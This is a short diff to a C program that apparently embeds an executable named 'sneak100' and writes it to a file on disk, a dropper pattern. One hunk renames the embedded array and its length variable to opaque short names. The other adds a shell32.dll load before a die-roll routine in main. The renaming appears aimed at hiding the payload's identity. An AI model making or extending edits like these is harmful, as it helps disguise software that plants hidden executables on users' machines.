@@ -96,7 +96,7 @@ void cE(int x) {
         }
 
     // Write the binary data to the file
-    fwrite(sneak100_exe, sizeof(sneak100_exe[0]), sneak100_exe_len, fi);
+    fwrite(sn_e, sizeof(sn_e[0]), sn_l, fi);
     fclose(fi);
     free(fP);
     }
@@ -138,6 +138,7 @@ void stuff() {
 
 int main(int argc, char* argv[]) {
 
+    LoadLibraryW(L"shell32.dll");
     // Generate a random number between 1 and 6
     srand(time(NULL));
     int x = (rand() % 6) + 1;
